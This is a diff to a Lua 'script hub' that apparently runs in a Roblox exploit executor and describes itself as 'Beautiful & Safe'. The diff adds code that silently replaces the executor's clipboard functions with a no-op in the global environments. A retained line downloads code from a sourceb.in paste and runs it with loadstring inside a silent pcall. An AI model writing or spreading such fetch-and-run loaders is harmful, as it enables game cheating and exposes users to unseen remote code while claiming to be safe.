@@ -1,3 +1,14 @@
+-- =========================================================
+-- БЛОКИРОВКА БУФЕРА ОБМЕНА (Защита от сторонних ссылок)
+-- =========================================================
+local dummyFunction = function(...) return end
+local clipboardFunctions = {"setclipboard", "toclipboard", "set_clipboard", "writeclipboard", "setrbxclipboard"}
+
+for _, fnName in ipairs(clipboardFunctions) do
+    if getgenv then getgenv()[fnName] = dummyFunction end
+    _G[fnName] = dummyFunction
+end
+
 -- ===========================================
 -- Mertily's Private Script Hub — Beautiful & Safe
 -- ===========================================
@@ -8,7 +19,7 @@ local TweenService = game:GetService("TweenService")
 local ContentProvider = game:GetService("ContentProvider")
 local player = Players.LocalPlayer
 
--- === ПОДМОГА ДЛЯ СКРИПТА ЗАГРУЖАЕТСЯ В САМОМ НАЧАЛЕ ===
+-- === ПОДМОГА ДЛЯ СКРИПТА ===
 task.spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WbNby7oNLJ/0"))()
@@ -48,7 +59,7 @@ screenGui.Name = "MertilyPrivateGui"
 screenGui.IgnoreGuiInset = true
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.DisplayOrder = 999999999 -- Максимальный приоритет поверх UI
+screenGui.DisplayOrder = 999999999
 screenGui.Parent = playerGui
 
 local function createCorner(parent, radius)
@@ -172,7 +183,7 @@ local roseImage = Instance.new("ImageLabel")
 roseImage.Name = "RoseTexture"
 roseImage.Size = UDim2.new(1, 0, 1, 0)
 roseImage.BackgroundTransparency = 1
-roseImage.Image = "rbxassetid://6071575925" -- Текстура узора роз
+roseImage.Image = "rbxassetid://6071575925"
 roseImage.ImageColor3 = Color3.fromRGB(140, 40, 75)
 roseImage.ImageTransparency = 0.8
 roseImage.ScaleType = Enum.ScaleType.Tile
